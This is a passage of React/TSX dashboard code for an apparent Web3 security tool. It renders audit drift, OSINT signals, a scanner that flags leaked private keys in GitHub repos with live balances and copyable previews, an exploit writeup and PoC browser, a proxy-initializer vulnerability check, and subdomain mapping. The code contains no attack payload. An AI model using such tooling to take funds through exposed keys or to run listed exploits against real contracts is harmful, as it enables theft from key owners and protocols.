                          {isRu ? `Файлы вне области аудита (${result.comparison.unaudited_files_count}):` : `Files Outside Audit Scope (${result.comparison.unaudited_files_count}):`}
                        </p>
                        <div className="flex flex-wrap gap-1.5">
                          {result.comparison.unaudited_files.slice(0, 15).map((uf: string, ufi: number) => (
                            <code key={ufi} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground">
                              {uf}
                            </code>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Parsed Audit Reports */}
                {result.parsed_audits?.length > 0 && (
                  <div>
                    <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-semibold">
                      📄 {isRu ? "Разобранные аудиторские отчёты в репозитории" : "Parsed Audit Reports in Repository"}
                    </p>
                    <div className="space-y-2">
                      {result.parsed_audits.map((pa: any, idx: number) => (
                        <div key={idx} className="rounded-lg border border-border bg-background p-3 space-y-2">
                          <div className="flex flex-wrap items-center justify-between gap-2">
                            <div>
                              <span className="font-bold text-foreground">{pa.auditor}</span>
                              <span className="ml-2 text-muted-foreground">({pa.file})</span>
                            </div>
                            <div className="flex items-center gap-3 text-[11px]">
                              <span className="text-muted-foreground">{pa.date}</span>
                              <span>
                                C:<b className="text-destructive">{pa.critical}</b> H:<b className="text-primary">{pa.high}</b> M:{pa.medium} L:{pa.low}
                              </span>
                            </div>
                          </div>
                          {pa.findings?.length > 0 && (
                            <div className="grid grid-cols-1 gap-1 sm:grid-cols-2 pt-1 border-t border-border/60">
                              {pa.findings.slice(0, 6).map((pf: any, pfi: number) => (
                                <div key={pfi} className="truncate text-[10px] text-muted-foreground">
                                  • <b className="text-foreground">[{pf.severity}]</b> {pf.title}
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Git Drift Section */}
                {result.drift && (
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2.5">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="font-bold text-primary uppercase text-[11px]">
                        🔄 Post-Audit Git Drift ({result.drift.audit_commit?.slice(0, 8) || "baseline"} → {result.drift.current_commit?.slice(0, 8)})
                      </span>
                      <span className="text-[11px] text-muted-foreground">
                        {result.drift.commits_since_audit ? `${result.drift.commits_since_audit} commits · ` : ""}
                        +{result.drift.files_added} added · ~{result.drift.files_modified} modified · -{result.drift.files_removed} removed
                        {result.drift.requires_reaudit ? " · ⚠️ RE-AUDIT RECOMMENDED" : ""}
                      </span>
                    </div>
                    {result.drift.new_contracts?.length > 0 && (
                      <p className="text-[11px] text-destructive">
                        <b>{isRu ? "Новые контракты после аудита:" : "New contracts since audit:"}</b>{" "}
                        {result.drift.new_contracts.slice(0, 12).join(", ")}
                      </p>
                    )}
                    {result.drift.modified_contracts?.length > 0 && (
                      <p className="text-[11px] text-muted-foreground">
                        <b className="text-foreground">{isRu ? "Изменённые контракты:" : "Modified contracts:"}</b>{" "}
                        {result.drift.modified_contracts
                          .slice(0, 12)
                          .map((mc: any) => (typeof mc === "string" ? mc : mc.file || mc.path || JSON.stringify(mc)))
                          .join(", ")}
                      </p>
                    )}
                    {result.drift.new_admin_functions?.length > 0 && (
                      <p className="text-[11px] text-amber-400">
                        <b>🔐 New Admin Functions Added:</b>{" "}
                        {result.drift.new_admin_functions.map((af: any) => `${af.file} (${af.old_count}→${af.new_count})`).join(", ")}
                      </p>
                    )}
                    {result.drift.removed_access_control?.length > 0 && (
                      <p className="text-[11px] text-destructive font-bold">
                        🚨 Access Control Removed:{" "}
                        {result.drift.removed_access_control.map((ac: any) => `${ac.file} (${ac.old_count}→${ac.new_count})`).join(", ")}
                      </p>
                    )}
                  </div>
                )}

                {/* Recent Git Commits */}
                {result.recent_commits?.length > 0 && (
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                    <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                      🕒 {isRu ? "Последние коммиты в репозитории (Git Log)" : "Recent Repository Commits (Git Log)"}
                    </p>
                    <div className="space-y-1 max-h-44 overflow-y-auto">
                      {result.recent_commits.map((cm: any, cmi: number) => (
                        <div key={cmi} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                          <div className="flex items-center gap-2 min-w-0 flex-1">
                            <code className="text-primary font-bold shrink-0">{cm.hash}</code>
                            <span className="truncate text-foreground">{cm.message}</span>
                          </div>
                          <span className="text-[10px] text-muted-foreground shrink-0">
                            {cm.author} · {cm.date}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </>
          ) : (
            <>
              <div className="grid grid-cols-3 gap-3">
                {[
                  { k: "Δ Total", v: result.delta_total },
                  { k: "Δ Critical", v: result.delta_critical },
                  { k: "Δ High", v: result.delta_high },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4 text-center">
                    <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className={`mt-1 font-mono text-xl font-bold ${Number(c.v) > 0 ? "text-destructive" : Number(c.v) < 0 ? "text-primary" : "text-foreground"}`}>
                      {Number(c.v) > 0 ? `+${c.v}` : c.v}
                    </p>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}

      {result && tool === "social" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Проект" : "Project", v: result.project_id },
              { k: "Trust Score", v: `${result.trust_score}/100` },
              { k: "Social Risk", v: `${result.social_score}/100` },
              { k: isRu ? "Сигналы" : "Signals", v: result.signals_total },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 truncate font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          {result.platforms?.length > 0 && (
            <div className="rounded-xl border border-border bg-card p-5">
              <p className="mb-2 font-mono text-[10px] uppercase tracking-wider text-primary">
                {isRu ? "Платформы" : "Platforms"}
              </p>
              <div className="space-y-1.5">
                {result.platforms.map((p: any, i: number) => (
                  <div key={i} className="flex items-center justify-between gap-3 rounded-lg border border-border bg-background px-3 py-2 font-mono text-xs">
                    <span className="font-bold uppercase text-primary">{p.platform}</span>
                    <span className="flex-1 truncate text-muted-foreground">{p.url}</span>
                    <span className="text-foreground">{fmt(p.followers, 0)} followers</span>
                  </div>
                ))}
              </div>
            </div>
          )}
          {result.signals?.length > 0 && (
            <div className="rounded-xl border border-border bg-card p-5 space-y-2">
              <p className="font-mono text-[10px] uppercase tracking-wider text-primary">{isRu ? "OSINT Сигналы" : "OSINT Signals"}</p>
              {result.signals.map((s: any, i: number) => (
                <div key={i} className="rounded-lg border border-border bg-background p-3 font-mono text-xs">
                  <div className="flex justify-between">
                    <span className="font-bold text-foreground">{s.type}</span>
                    <span className="text-muted-foreground">{s.platform} · {s.severity}</span>
                  </div>
                  <p className="mt-1 text-muted-foreground">{s.description}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {result && tool === "soroban" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Вердикт" : "Verdict", v: result.verdict || "—" },
              { k: "Overall Risk", v: `${result.overall_risk_score ?? 0}/100` },
              { k: "Trustlines", v: fmt(result.asset_profile?.trustlines, 0) },
              { k: "Bid Depth", v: `$${fmt(result.orderbook?.bid_depth_usd)}` },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="rounded-xl border border-border bg-card p-5 font-mono text-xs space-y-2">
            <p className="text-foreground font-bold">{result.target} ({result.target_type})</p>
            {result.verdict_detail && <p className="text-muted-foreground">{result.verdict_detail}</p>}
            {result.asset_profile?.home_domain && (
              <p className="text-primary">Domain: {result.asset_profile.home_domain} · LP Pools: {result.lp_pool_count ?? 0}</p>
            )}
            {result.signals?.length > 0 && (
              <div className="mt-3 space-y-1.5">
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-2.5">
                    <div className="flex justify-between">
                      <span className="font-bold text-foreground">{s.title || s.id}</span>
                      <span className="text-muted-foreground">{s.severity}</span>
                    </div>
                    <p className="mt-1 text-muted-foreground">{s.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "ospec" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-5">
            {[
              {
                k: isRu ? "🟢 Подтверждённые REAL" : "🟢 Verified REAL",
                v: fmt(result.db_stats?.real_findings ?? result.db_stats?.indexed_findings, 0),
                sub: isRu
                  ? `из ${fmt(result.db_stats?.indexed_findings, 0)} проверенных`
                  : `of ${fmt(result.db_stats?.indexed_findings, 0)} scanned`,
              },
              {
                k: isRu ? "🔥 Живые ключи (LIVE)" : "🔥 Live Verified Keys",
                v: fmt(result.db_stats?.live_keys ?? 0, 0),
                sub: isRu ? "активный баланс / RPC / nonce" : "active on-chain / RPC",
              },
              {
                k: isRu ? "📦 Просканировано репо" : "📦 Scanned Repos",
                v: fmt(result.db_stats?.indexed_repos, 0),
                sub: isRu
                  ? `${fmt(result.db_stats?.real_repos ?? 0, 0)} репо с REAL`
                  : `${fmt(result.db_stats?.real_repos ?? 0, 0)} repos w/ REAL`,
              },
              {
                k: "🔴 Critical (REAL)",
                v: fmt(result.db_stats?.by_severity?.CRITICAL ?? 0, 0),
                sub: isRu ? "приватники / seed / prod" : "privkeys / seeds / prod",
              },
              {
                k: "🟠 High (REAL)",
                v: fmt(result.db_stats?.by_severity?.HIGH ?? 0, 0),
                sub: isRu ? `Радар: ${fmt(result.db_stats?.radar_total ?? 0, 0)} репо` : `Radar: ${fmt(result.db_stats?.radar_total ?? 0, 0)} repos`,
              },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
                {c.sub && <p className="mt-0.5 font-mono text-[10px] text-muted-foreground">{c.sub}</p>}
              </div>
            ))}
          </div>

          <div className="rounded-xl border border-border bg-card p-5">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <p className="font-mono text-[11px] uppercase tracking-wider text-primary font-bold">
                🔐 {isRu ? "OSPEC — Сгруппированные находки по репозиториям (L2.5 Filtered)" : "OSPEC — Grouped Secret Findings by Repository (L2.5 Filtered)"}
              </p>
              <div className="flex flex-wrap items-center gap-2 font-mono text-[11px] text-muted-foreground">
                <span>
                  Mode: <b className="text-foreground">{result.filter_mode}</b> ·{" "}
                  <b className="text-foreground">{fmt(result.total_groups ?? result.findings_returned, 0)}</b> groups
                </span>
                {Number(result.total_groups || 0) > Number(result.limit || 15) && (
                  <div className="flex items-center gap-1 ml-2">
                    <button
                      type="button"
                      disabled={ospecOffset <= 0 || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: Math.max(0, ospecOffset - step) });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      ⬅️ {isRu ? "Назад" : "Prev"}
                    </button>
                    <span className="px-1.5 text-[10px] text-foreground">
                      {Math.floor(ospecOffset / Number(result.limit || 15)) + 1} /{" "}
                      {Math.max(1, Math.ceil(Number(result.total_groups || 1) / Number(result.limit || 15)))}
                    </span>
                    <button
                      type="button"
                      disabled={ospecOffset + Number(result.limit || 15) >= Number(result.total_groups || 0) || loading}
                      onClick={() => {
                        const step = Number(result.limit || 15);
                        runOspecWithFilters({ offset: ospecOffset + step });
                      }}
                      className="rounded border border-border bg-background px-2 py-0.5 text-[10px] font-semibold text-foreground hover:border-primary disabled:opacity-40"
                    >
                      {isRu ? "Вперёд" : "Next"} ➡️
                    </button>
                  </div>
                )}
              </div>
            </div>

            {!result.findings || result.findings.length === 0 ? (
              <p className="font-mono text-xs text-muted-foreground py-4 text-center">
                {isRu ? "📭 Нет находок по выбранному фильтру" : "📭 No findings match the current filter"}
              </p>
            ) : (
              <div className="space-y-2.5 max-h-[540px] overflow-y-auto pr-1">
                {result.findings.map((f: any) => {
                  const isReal = f.cls === "REAL";
                  return (
                    <div
                      key={f.id}
                      className="rounded-xl border border-border bg-background p-3.5 font-mono text-xs transition-colors hover:border-primary/40"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <div className="flex flex-wrap items-center gap-2">
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              f.severity === "CRITICAL"
                                ? "bg-destructive/20 text-destructive border border-destructive/40"
                                : "bg-primary/15 text-primary border border-primary/40"
                            }`}
                          >
                            {f.severity === "CRITICAL" ? "🔴 CRITICAL" : `🟠 ${f.severity}`}
                          </span>
                          <span
                            className={`rounded px-2 py-0.5 text-[10px] font-bold ${
                              isReal
                                ? "bg-green-500/15 text-green-400 border border-green-500/40"
                                : "bg-muted text-muted-foreground"
                            }`}
                          >
                            {isReal ? "🟢 REAL" : `🧪 ${f.cls || "TEST"}`}
                          </span>
                          <span className="font-bold text-foreground">
                            {f.kind} <span className="text-primary">×{f.hits}</span>
                          </span>
                          {f.is_live && (
                            <span className="rounded bg-amber-500/20 px-2 py-0.5 text-[10px] font-bold text-amber-400">
                              🔥 LIVE
                            </span>
                          )}
                          {f.balance_eth ? (
                            <span className="rounded bg-green-500/20 px-2 py-0.5 text-[10px] font-bold text-green-400">
                              💰 {f.balance_eth} ETH
                            </span>
                          ) : null}
                          {f.nonce ? (
                            <span className="rounded bg-cyan-500/15 px-2 py-0.5 text-[10px] font-bold text-cyan-400">
                              ⚡ nonce {f.nonce}
                            </span>
                          ) : null}
                        </div>
                        <div className="flex items-center gap-2">
                          {f.found_at && (
                            <span className="text-[10px] text-muted-foreground">{f.found_at}</span>
                          )}
                          <button
                            type="button"
                            onClick={() => handleToggleOspecFinding(f.id)}
                            className="inline-flex items-center gap-1 rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 font-mono text-[10px] font-semibold text-primary transition-colors hover:bg-primary hover:text-primary-foreground"
                          >
                            <Eye size={11} />
                            <span>
                              {loadingFindingId === f.id
                                ? isRu ? "Загрузка…" : "Loading…"
                                : expandedFindingId === f.id
                                ? isRu ? "Скрыть" : "Close"
                                : isRu ? "Открыть" : "Open"}
                            </span>
                          </button>
                        </div>
                      </div>

                      <div className="mt-2 flex flex-wrap items-center justify-between gap-2 text-[11px]">
                        <a
                          href={f.repo_url}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="font-semibold text-primary hover:underline truncate"
                        >
                          📦 {f.ticker || f.repo_url}
                        </a>
                        {f.gh_url ? (
                          <a
                            href={f.gh_url}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="text-muted-foreground hover:text-foreground truncate"
                          >
                            📄 {f.path}{f.line ? `:${f.line}` : ""} ↗
                          </a>
                        ) : (
                          <span className="text-muted-foreground truncate">
                            📄 {f.path}
                          </span>
                        )}
                      </div>

                      {(f.derived_addr || f.secret_masked) && (
                        <div className="mt-2 flex flex-wrap items-center justify-between gap-2 border-t border-border/60 pt-2 text-[11px] text-muted-foreground">
                          {f.derived_addr ? (
                            <span>
                              🔑 <code className="text-foreground">{f.derived_addr}</code>{" "}
                              {f.derived_chain ? `(${f.derived_chain})` : ""}
                            </span>
                          ) : (
                            <span />
                          )}
                          {f.secret_masked && (
                            <span>
                              Preview: <code className="text-primary">{f.secret_masked}</code>
                            </span>
                          )}
                        </div>
                      )}

                      {expandedFindingId === f.id && findingDetail[f.id] && (
                        <div className="mt-3 rounded-lg border border-primary/30 bg-card p-3 space-y-2">
                          <div className="flex items-center justify-between text-[10px] uppercase tracking-wider text-primary font-bold">
                            <span>
                              {isRu
                                ? `Детализация всех вхождений в репозитории (${findingDetail[f.id].occurrences_count})`
                                : `All Secret Occurrences in Repository (${findingDetail[f.id].occurrences_count})`}
                            </span>
                            <a
                              href={f.repo_url}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="underline hover:text-foreground"
                            >
                              GitHub Repo ↗
                            </a>
                          </div>
                          <div className="space-y-1.5 max-h-60 overflow-y-auto pr-1">
                            {(findingDetail[f.id].occurrences || []).map((occ: any) => (
                              <div
                                key={occ.id}
                                className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-background px-2.5 py-1.5 text-[11px]"
                              >
                                <a
                                  href={occ.gh_url || f.repo_url}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="font-semibold text-foreground hover:text-primary truncate max-w-[260px]"
                                >
                                  📄 {occ.path}{occ.line ? `:${occ.line}` : ""} ↗
                                </a>
                                <div className="flex items-center gap-2">
                                  {occ.cls && (
                                    <span
                                      className={`rounded px-1.5 py-0.5 text-[9px] font-bold ${
                                        occ.cls === "REAL"
                                          ? "bg-green-500/15 text-green-400"
                                          : "bg-muted text-muted-foreground"
                                      }`}
                                    >
                                      {occ.cls}
                                    </span>
                                  )}
                                  {occ.is_live && (
                                    <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] font-bold text-amber-400">
                                      🔥 LIVE
                                    </span>
                                  )}
                                  <code className="rounded bg-card px-2 py-0.5 text-primary select-all">
                                    {occ.secret_preview}
                                  </code>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      navigator.clipboard.writeText(occ.secret_preview || "");
                                      setCopiedSecretId(String(occ.id));
                                      setTimeout(() => setCopiedSecretId(null), 1500);
                                    }}
                                    className="rounded border border-border p-1 text-muted-foreground hover:border-primary hover:text-primary"
                                    title={isRu ? "Скопировать" : "Copy"}
                                  >
                                    {copiedSecretId === String(occ.id) ? <Check size={11} /> : <Copy size={11} />}
                                  </button>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      )}

      {/* 9. 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
      {result && tool === "hacks" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">
                {result.mode === "kb_search" ? `KB Query: ${result.query}` : result.target}
              </span>
              {result.chain && <span className="ml-2 text-muted-foreground">({result.chain})</span>}
            </div>
            <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
              {result.verdict} {result.total_pattern_risk !== undefined ? `· Score: ${result.total_pattern_risk}` : ""}
            </span>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "База подробных разборов (PoC)" : "Deep Writeups DB (PoC)"}
              </p>
              <p className="mt-1 text-sm font-bold text-primary">
                {result.total_writeups_db || 1678} writeups
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">DeFiHackLabs Index</p>
              <p className="mt-1 text-sm font-bold text-foreground">
                {result.total_defihacklabs_db || 861} exploits
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">
                {isRu ? "Суммарная база знаний" : "Combined Exploit KB"}
              </p>
              <p className="mt-1 text-sm font-bold text-green-400">
                {result.total_combined_db || result.total_incidents_in_db || 2539} total incidents
              </p>
            </div>
          </div>

          {/* MODE A: Direct Search across 1,678 Deep Writeups */}
          {result.mode === "kb_search" && Array.isArray(result.writeups) && (
            <div className="space-y-3">
              {result.writeups.map((w: any, idx: number) => {
                const wKey = w.slug || w.title || String(idx);
                const isOpen = expandedWriteupSlug === wKey;
                const wData = writeupCache[wKey];
                return (
                  <div key={idx} className="rounded-lg border border-border bg-background p-4 space-y-2">
                    <div className="flex flex-wrap items-start justify-between gap-2">
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                            {w.chain || "EVM"}
                          </span>
                          <span className="text-[10px] text-muted-foreground">{w.date}</span>
                          <span className="font-bold text-sm text-foreground">{w.title}</span>
                        </div>
                        {w.loss && (
                          <p className="mt-1 text-[11px] font-bold text-red-400">
                            💥 Loss: {w.loss}
                          </p>
                        )}
                      </div>
                      <button
                        type="button"
                        onClick={() => handleToggleWriteup(w.slug, w.title)}
                        className="inline-flex items-center gap-1.5 rounded-lg bg-primary px-3 py-1.5 text-[11px] font-semibold text-primary-foreground hover:bg-primary-dim"
                      >
                        <BookOpen size={12} />
                        <span>
                          {loadingWriteupSlug === wKey
                            ? isRu ? "Загрузка…" : "Loading…"
                            : isOpen
                            ? isRu ? "Скрыть разбор" : "Hide Writeup"
                            : isRu ? "Открыть разбор & PoC" : "Open Writeup & PoC"}
                        </span>
                      </button>
                    </div>

                    {w.description && (
                      <p className="text-[11px] text-muted-foreground leading-relaxed">{w.description}</p>
                    )}

                    {Array.isArray(w.tags) && w.tags.length > 0 && (
                      <div className="flex flex-wrap gap-1.5 pt-1">
                        {w.tags.map((tg: string, ti: number) => (
                          <span
                            key={ti}
                            className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground"
                          >
                            {tg}
                          </span>
                        ))}
                      </div>
                    )}

                    {isOpen && wData && (
                      <div className="mt-3 rounded-xl border border-primary/40 bg-card p-4 space-y-2">
                        {wData.error ? (
                          <p className="text-red-400">⚠️ {wData.error}</p>
                        ) : (
                          <>
                            <div className="flex items-center justify-between border-b border-border pb-2">
                              <span className="text-[11px] font-bold text-primary">
                                📄 {wData.file}
                              </span>
                              <button
                                type="button"
                                onClick={() => navigator.clipboard.writeText(wData.markdown || "")}
                                className="rounded border border-border bg-background px-2.5 py-1 text-[10px] text-muted-foreground hover:border-primary hover:text-primary"
                              >
                                {isRu ? "Скопировать весь разбор + PoC" : "Copy Writeup + PoC"}
                              </button>
                            </div>
                            <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap text-[11px] text-foreground leading-relaxed">
                              {wData.markdown}
                            </pre>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}

          {/* MODE B: 0x Contract Source Cross-Reference */}
          {result.mode !== "kb_search" && (
            <div className="space-y-3">
              {(result.matched_patterns || []).map((mp: any, idx: number) => (
                <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                        Score {mp.score} (hits: {mp.hits})
                      </span>
                      <span className="font-bold text-foreground">{mp.attack_type}</span>
                    </div>
                    <code className="text-[10px] text-muted-foreground">{mp.pattern}</code>
                  </div>
                  <p className="text-[11px] text-muted-foreground">{mp.note}</p>

                  {/* Deep Writeups from the 1,678 DB */}
                  {Array.isArray(mp.deep_writeups) && mp.deep_writeups.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2 space-y-2">
                      <p className="text-[10px] uppercase text-primary font-semibold">
                        {isRu ? "Подробные разборы и Foundry PoC из базы 1,678 взломов:" : "Deep Writeups & Foundry PoCs (1,678 DB):"}
                      </p>
                      {mp.deep_writeups.map((dw: any, di: number) => {
                        const wKey = dw.slug || dw.title || `${idx}_${di}`;
                        const isOpen = expandedWriteupSlug === wKey;
                        const wData = writeupCache[wKey];
                        return (
                          <div key={di} className="rounded border border-border bg-card p-2.5 space-y-1.5">
                            <div className="flex flex-wrap items-center justify-between gap-2">
                              <span className="font-bold text-foreground">{dw.title}</span>
                              <button
                                type="button"
                                onClick={() => handleToggleWriteup(dw.slug, dw.title)}
                                className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-[10px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                              >
                                <BookOpen size={11} />
                                <span>{isOpen ? (isRu ? "Скрыть PoC" : "Hide PoC") : isRu ? "Разбор & PoC" : "Writeup & PoC"}</span>
                              </button>
                            </div>
                            {dw.loss && <p className="text-[10px] text-red-400">Loss: {dw.loss}</p>}
                            {isOpen && wData?.markdown && (
                              <pre className="mt-2 max-h-80 overflow-y-auto rounded border border-border bg-background p-3 whitespace-pre-wrap text-[11px] text-foreground">
                                {wData.markdown}
                              </pre>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}

                  {Array.isArray(mp.related_hacks) && mp.related_hacks.length > 0 && (
                    <div className="mt-2 border-t border-border/60 pt-2">
                      <p className="mb-1.5 text-[10px] uppercase text-muted-foreground font-semibold">
                        {isRu ? "Дополнительные инциденты из DeFiHackLabs (861):" : "Additional Precedents (DeFiHackLabs 861):"}
                      </p>
                      <div className="grid grid-cols-1 gap-1.5 sm:grid-cols-2">
                        {mp.related_hacks.map((h: any, hi: number) => (
                          <div key={hi} className="flex items-center justify-between rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                            <span className="font-semibold text-foreground truncate">{h.protocol}</span>
                            <span className="text-red-400 font-bold">{h.lost}</span>
                            <span className="text-[10px] text-muted-foreground">{h.date}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 10. Proxy & EIP-1967 Upgradeability Inspector */}
      {result && tool === "proxy" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div>
              <span className="text-primary font-bold">{result.address}</span>
              <span className="ml-2 text-muted-foreground">({result.chain})</span>
            </div>
            <span
              className={`rounded border px-2.5 py-0.5 text-[11px] font-bold ${
                result.status === "VULN"
                  ? "border-red-500/50 bg-red-500/15 text-red-400"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.status} · {result.is_proxy ? "PROXY DETECTED" : "STANDALONE CONTRACT"}
            </span>
          </div>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">EIP-1967 Implementation</p>
              <p className="mt-1 truncate font-bold text-foreground">
                {result.eip1967?.implementation || "None (or custom slot)"}
              </p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Proxy Admin Slot</p>
              <p className="mt-1 truncate font-bold text-primary">
                {result.eip1967?.admin || "None"}
              </p>
              <p className="mt-0.5 text-[10px] text-muted-foreground">{result.eip1967?.admin_type}</p>
            </div>
            <div className="rounded-lg border border-border bg-background p-3">
              <p className="text-[10px] uppercase text-muted-foreground">Bytecode Size / Beacon</p>
              <p className="mt-1 font-bold text-foreground">{result.codesize} bytes</p>
              <p className="mt-0.5 truncate text-[10px] text-muted-foreground">
                Beacon: {result.eip1967?.beacon || "—"}
              </p>
            </div>
          </div>

          {(result.targets_checked || []).map((tc: any, idx: number) => (
            <div key={idx} className="rounded-lg border border-border bg-background p-3.5 space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="font-bold text-foreground">
                  [{tc.target?.toUpperCase()}] {tc.addr}
                </span>
                <div className="flex gap-2 text-[10px]">
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    upgradeSelector: <b>{tc.has_upgrade ? "YES" : "NO"}</b>
                  </span>
                  <span className="rounded border border-border bg-card px-2 py-0.5">
                    _disableInitializers: <b>{tc.has_disable ? "YES" : "NO"}</b>
                  </span>
                </div>
              </div>
              {Array.isArray(tc.inits) && tc.inits.length > 0 ? (
                <div className="space-y-1.5 pt-1">
                  {tc.inits.map((ini: any, ii: number) => (
                    <div
                      key={ii}
                      className={`flex flex-wrap items-center justify-between gap-2 rounded border px-2.5 py-1.5 text-[11px] ${
                        ini.vulnerable
                          ? "border-red-500/50 bg-red-500/10 text-red-400"
                          : "border-border bg-card text-muted-foreground"
                      }`}
                    >
                      <code className="font-bold text-foreground">{ini.sig} (0x{ini.selector})</code>
                      <span>{ini.reason}</span>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-[11px] text-muted-foreground">
                  {isRu
                    ? "Открытых функций initialize() без аргументов в байткоде/ABI не обнаружено."
                    : "No exposed argumentless initialize() selectors detected."}
                </p>
              )}
            </div>
          ))}
        </div>
      )}

      {/* 11. Web3 Off-Chain Surface Mapper */}
      {result && tool === "surface" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2.5">
              <span className="text-sm font-bold text-primary">🌐 {result.domain}</span>
              <span className="text-muted-foreground">({result.scanned_url})</span>
              {result.linked_protocol && (
                <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-0.5 text-[10px] font-bold text-emerald-400">
                  ✓ {result.linked_protocol.name} {result.linked_protocol.symbol ? `($${result.linked_protocol.symbol})` : ""} · {result.linked_protocol.category}
                </span>
              )}
            </div>
            <div className="flex flex-wrap items-center gap-2">
              <span className="rounded border border-primary/40 bg-primary/15 px-2.5 py-0.5 text-[11px] font-bold text-primary">
                Alive Subdomains: {result.subdomains_count || 0} (Probed: {result.subdomains_probed || 38})
              </span>
              <span className="rounded border border-border bg-background px-2.5 py-0.5 text-[11px] text-foreground">
                On-Chain / JS Contracts: {(result.contracts_enriched || result.frontend?.contracts || []).length}
              </span>
            </div>
